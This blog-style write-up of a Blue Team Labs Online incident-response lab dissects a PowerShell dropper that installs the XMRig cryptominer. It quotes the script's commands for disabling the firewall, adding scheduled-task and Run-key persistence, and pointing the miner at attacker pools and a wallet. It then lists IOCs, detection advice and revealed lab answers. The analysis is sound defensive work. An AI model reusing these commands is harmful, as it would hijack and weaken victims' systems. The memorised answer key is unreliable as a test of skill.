---
layout: lab
title: Crypto
platform: BTLO
difficulty: Medium
category: Incident Response
skill: Incident Response
tools: "[Wireshark, PowerShell Analysis, Volatility, Grep]"
tactics:
mitre: "[T1059.004 T1059.001, T1053.005, T1547.001, T1562.004, T1496, T1036.005, T1105]"
proof: https://blueteamlabs.online/achievement/share/144656/99
challenge_url: https://blueteamlabs.online/home/investigation/crypto-a198b21c7a
permalink: /blue-team/labs/crypto/
summary: '"Analyse a malicious PowerShell dropper, extract XMRig from a PCAP, and confirm active cryptomining execution via Volatility memory forensics across a multi-server compromise."'
art: https://blueteamlabs.online/storage/labs/5b259479daa706b70bbc9debe66c2a0255ffdfdd.png
type:
points:
youtube:
locked: tate
---
## Scenario

Multiple Windows servers are experiencing sustained CPU spikes. A suspicious PowerShell script is recovered from each affected system along with a PCAP from one server and a full memory dump. The task is to reconstruct the full kill chain — from the initial dropper through to active miner execution — using static script analysis, network forensics, and memory analysis.

---

## Methodology

### Stage 1 — PowerShell Dropper Analysis

The investigation starts with the recovered `.ps1` script. Static analysis immediately surfaces the C2 infrastructure, payload delivery mechanism, persistence methods, and mining pool configuration — everything needed to understand the attack before touching the PCAP or memory dump.

The script structure reveals a clear sequence:

```zsh
$cc = "http://80.71.158.96"
$sys=-join ([char[]](48..57+97..122) | Get-Random -Count (Get-Random (6..12)))
$dst="$env:AppData\network02.exe"
$dst2="$env:TMP\network02.exe"
```

The C2 server is `80[.]71[.]158[.]96`. The payload `wxm.exe` is downloaded twice — once to `AppData\Roaming` as the persistent copy and once to `%TMP%` as the execution staging location. Both are renamed to `network02.exe` — a masquerade name chosen to blend into process listings alongside legitimate Windows network services.

Windows Firewall is immediately disabled before any download occurs:

```zsh
netsh advfirewall set allprofiles state off
```

This ensures outbound mining pool connections aren't blocked and removes a detection layer before the miner is executed.

### Stage 2 — Persistence Mechanisms

The script establishes redundant persistence via both scheduled tasks and registry Run keys — two independent methods ensuring survival across reboots even if one is removed:

```zsh
schtasks /create /F /sc minute /mo 1 /tn "BrowserUpdate" /tr "$dst --donate-level 1 -o b.oracleservice.top -o 198.23.214.117:8080 -o 51.79.175.139:8080 -o 167.114.114.169:8080 -u 46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ -p x -B"

schtasks /create /F /sc minute /mo 1 /tn "Browser2Update" /tr "$dst2 ..."

reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Run /d "$dst ..."
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Run2 /d "$dst2 ..."
```

Two scheduled tasks (`BrowserUpdate`, `Browser2Update`) run every minute — one for each binary copy. The task names mimic legitimate browser update processes. The XMRig `-u` flag carries the Monero wallet address used to receive mined funds; `-p x` is the pool password (XMRig convention for pools that don't require authentication); `-B` runs the miner in background mode.

Mining pools configured for failover:

- `b[.]oracleservice[.]top`
- `198[.]23[.]214[.]117:8080`
- `51[.]79[.]175[.]139:8080`
- `167[.]114[.]114[.]169:8080`

Multiple pool endpoints provide resilience — blocking one pool address does not stop mining.

### Stage 3 — PCAP Analysis (Wireshark)

Opening the PCAP in Wireshark, **File → Export Objects → HTTP** recovers `wxm.exe` directly from the capture — the binary download from `80.71.158.96` is unencrypted HTTP, making extraction trivial.

The server response headers confirm the C2 infrastructure:

```
nginx/1.14.0 (Ubuntu)
```

Hashing the extracted binary:

```
md5sum wxm.exe
# 3edcde37dcecb1b5a70b727ea36521de

sha256sum wxm.exe
# 366b32c15ff2b30da5cafc1407e6dc49aa4bbecffc34c438302022acd1c00b8e
```

### Stage 4 — Binary String Analysis

`strings` confirms the binary identity and version:

```zsh
strings wxm.exe | grep -i "xmrig"
```

```
XMRig 6.16.2
```

XMRig 6.16.2 is a legitimate open-source Monero miner routinely weaponised in cryptojacking campaigns. The binary itself is not obfuscated — the attacker relies on the masquerade name and firewall disable to avoid detection rather than binary-level evasion.

### Stage 5 — Memory Forensics (Volatility 2)

The memory dump requires Volatility 2 (`volatility-master`) rather than Volatility 3 — the profile flag syntax differs from the `windows.` plugin namespace used in Vol3:

```zsh
python vol.py -f ~/Desktop/memdump.mem --profile=Win10x64_17134 pslist | grep -i "network02"
```

```
0xffffd98cdf161080 network02.exe    6688   3384   13   0   1   0   2022-03-16 02:05:57 UTC+0000
```

PID **6688**, started `2022-03-16 02:05:57 UTC+0000`. The process is live in memory confirming active execution at the time of the dump.

**Note on Vol2 performance:** `psscan` and `filescan` perform full physical memory scans — on a 4.5GB dump this takes 30-45 minutes per plugin on lab VM hardware. Pipe output to file immediately and let it run:

```zsh
python vol.py -f ~/Desktop/memdump.mem --profile=Win10x64_17134 filescan > filescan.txt 2>&1 &
```

Grepping the completed filescan output for the masquerade binary name:

```zsh
cat filescan.txt | grep -i "network02.exe"
```

```
0x0000d98ce600e080   15   0 R--r-d \Device\HarddiskVolume1\Users\IEUser\AppData\Roaming\network02.exe
0x0000d98ce73048f0    1   0 R--r-d \Device\HarddiskVolume1\Users\IEUser\AppData\Local\Temp\network02.exe
```

Two physical offsets confirm both binary copies present in memory — the persistent `AppData\Roaming` copy and the `Temp` staging copy, consistent with the dropper script's dual-download logic.

---

## Attack Summary

|Phase|Action|
|---|---|
|Delivery|PowerShell dropper executed on multiple Windows servers|
|Defense Evasion|`netsh advfirewall set allprofiles state off` disables Windows Firewall|
|C2 Download|wxm.exe pulled twice from hxxp[://]80[.]71[.]158[.]96 → renamed network02.exe|
|Masquerading|Payload renamed network02.exe to blend into process listings|
|Persistence|Scheduled tasks BrowserUpdate + Browser2Update (every 1 min); Run + Run2 registry keys|
|Execution|XMRig 6.16.2 executed, mining Monero to attacker wallet via 4 pool endpoints|
|Confirmed|Vol2 psscan: PID 6688, started 2022-03-16 02:05:57 UTC+0000|

---

## IOCs

|Type|Value|
|---|---|
|IP (C2)|80[.]71[.]158[.]96|
|URL (Payload)|hxxp[://]80[.]71[.]158[.]96/wxm.exe|
|File (Downloaded)|wxm.exe|
|File (Deployed)|AppData\Roaming\network02.exe|
|File (Deployed)|AppData\Local\Temp\network02.exe|
|MD5|3edcde37dcecb1b5a70b727ea36521de|
|SHA256|366b32c15ff2b30da5cafc1407e6dc49aa4bbecffc34c438302022acd1c00b8e|
|Monero Wallet|46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ|
|Mining Pool|b[.]oracleservice[.]top|
|Mining Pool|198[.]23[.]214[.]117:8080|
|Mining Pool|51[.]79[.]175[.]139:8080|
|Mining Pool|167[.]114[.]114[.]169:8080|
|Scheduled Task|BrowserUpdate|
|Scheduled Task|Browser2Update|
|Registry Value|HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run — Run|
|Registry Value|HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run — Run2|
|PID|6688 (network02.exe)|
|Physical Offset|0x0000d98ce600e080|
|Physical Offset|0x0000d98ce73048f0|
|C2 Web Server|nginx/1.14.0 (Ubuntu)|

---

## MITRE ATT&CK

|Technique|ID|Description|
|---|---|---|
|PowerShell|T1059.001|Dropper script delivers and executes payload via PowerShell|
|Scheduled Task|T1053.005|BrowserUpdate and Browser2Update tasks execute miner every minute|
|Registry Run Keys|T1547.001|Run and Run2 values persist miner across reboots|
|Disable or Modify System Firewall|T1562.004|netsh advfirewall disables all firewall profiles pre-execution|
|Resource Hijacking|T1496|XMRig 6.16.2 mines Monero using victim server CPU|
|Masquerading: Rename System Utilities|T1036.005|wxm.exe renamed network02.exe to blend into process listings|
|Ingress Tool Transfer|T1105|wxm.exe downloaded twice from C2 to two separate staging locations|

---

## Defender Takeaways

**Firewall tampering as a pre-execution signal** — `netsh advfirewall set allprofiles state off` is one of the first commands executed, before any download occurs. This registry modification is detectable via Sysmon Event ID 13 or Windows Security Event 4719. An alert on bulk firewall policy changes — especially disabling all profiles simultaneously — provides pre-compromise warning before the miner ever runs.

**Redundant persistence requires complete remediation** — the attacker deploys four independent persistence mechanisms: two scheduled tasks and two Run keys, each pointing to a different binary copy. Removing only one leaves the miner running. Incident response must enumerate and remove all persistence artefacts before the binary copies are deleted, otherwise re-execution is guaranteed within 60 seconds.

**Process name masquerading** — `network02.exe` in `AppData\Roaming` is not a legitimate Windows binary. File integrity monitoring on `AppData` directories and process execution alerts for binaries running from user-writable paths are high-fidelity detection controls. Legitimate system processes do not run from `AppData` or `%TMP%`.

**CPU spike as a detection primitive** — the initial alert in this case was a CPU spike across multiple servers. Establishing a CPU utilisation baseline and alerting on sustained anomalous load (particularly across multiple hosts simultaneously) is a practical cryptomining detection layer that doesn't depend on signature or IOC matching. By the time XMRig is running, all other evasion has already succeeded — the resource consumption is unavoidable.

**Pool endpoint blocklisting** — the script configures four failover mining pool endpoints. Blocking all four at the egress firewall (`b.oracleservice.top`, `198.23.214.117`, `51.79.175.139`, `167.114.114.169`) prevents the miner from connecting to any pool regardless of which binary survives remediation. DNS-based blocking of `oracleservice.top` and its subdomains is worth adding as a durable control since the domain is purpose-built for cryptojacking infrastructure.

---

<div class="qa-item"> <div class="qa-question-text">Question 1) What is the IP address of the malicious server? (Format: X.X.X.X)</div> <div class="flag-reveal"> <input type="checkbox"> <span class="r-placeholder">Click flag to reveal</span> <span class="r-answer">80.71.158.96</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">Question 2) The script downloads an executable from this malicious IP, what is the name of it? (Format: filename.extension)</div> <div class="answer-reveal"> <input type="checkbox"> <span class="r-placeholder">Click to reveal answer</span> <span class="r-answer">wxm.exe</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">Question 3) Where are the executables files stored, and what are they renamed to? (Format: folder\file.ext, folder\file.ext)</div> <div class="flag-reveal"> <input type="checkbox"> <span class="r-placeholder">Click flag to reveal</span> <span class="r-answer">AppData\network02.exe, TMP\network02.exe</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">Question 4) What are the names of any scheduled tasks created for persistence? (Format: Name1, Name2)</div> <div class="answer-reveal"> <input type="checkbox"> <span class="r-placeholder">Click to reveal answer</span> <span class="r-answer">browserupdate, browser2update</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">Question 5) Research XMRig command-line options. What is the username and password used by the attacker? (Format: username, password)</div> <div class="flag-reveal"> <input type="checkbox"> <span class="r-placeholder">Click flag to reveal</span> <span class="r-answer">46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ, x</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">Question 6) To prevent outbound connections, other than the malicious server, what IPs or URLs should be blocked? (Don’t include ports, and list them in the order they appear) (Format: address, address...)</div> <div class="answer-reveal"> <input type="checkbox"> <span class="r-placeholder">Click to reveal answer</span> <span class="r-answer">b.oracleservice.top, 198.23.214.117, 51.79.175.139, 167.114.114.169</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">Question 7) Investigating the PCAP, retrieve a copy of the executable downloaded by the script. What are the first 5 characters of the SHA256 hash? (Format: XXXXX)</div> <div class="flag-reveal"> <input type="checkbox"> <span class="r-placeholder">Click flag to reveal</span> <span class="r-answer">366b3</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">Question 8) Review the strings in this executable. What version of XMRig is being deployed? (Format: X.XX.X)</div> <div class="answer-reveal"> <input type="checkbox"> <span class="r-placeholder">Click to reveal answer</span> <span class="r-answer">6.16.2</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">Question 9) What is the web server framework, version, and OS being used by the malicious server? (Format: Framework/X.XX.X (OS))</div> <div class="flag-reveal"> <input type="checkbox"> <span class="r-placeholder">Click flag to reveal</span> <span class="r-answer">nginx/1.14.0 (Ubuntu)</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">Question 10) What is the process ID of the cryptominer when executed on the system? (Format: PID)</div> <div class="answer-reveal"> <input type="checkbox"> <span class="r-placeholder">Click to reveal answer</span> <span class="r-answer">6688</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">Question 11) What time was this process started on the victim system? (Format: YYYY-MM-DD HH:MM:SS UTC+XXXX)</div> <div class="flag-reveal"> <input type="checkbox"> <span class="r-placeholder">Click flag to reveal</span> <span class="r-answer">2022-03-16 02:05:57+UTC+0000</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">Question 12) Use the Volatility filescan plugin and grep to identify the two final executables. What are the two physical offset values within the memory dump? (Format: 0x0000.... 0x0000...)</div> <div class="answer-reveal"> <input type="checkbox"> <span class="r-placeholder">Click to reveal answer</span> <span class="r-answer">0x0000d98ce600e080 0x0000d98ce73048f0</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

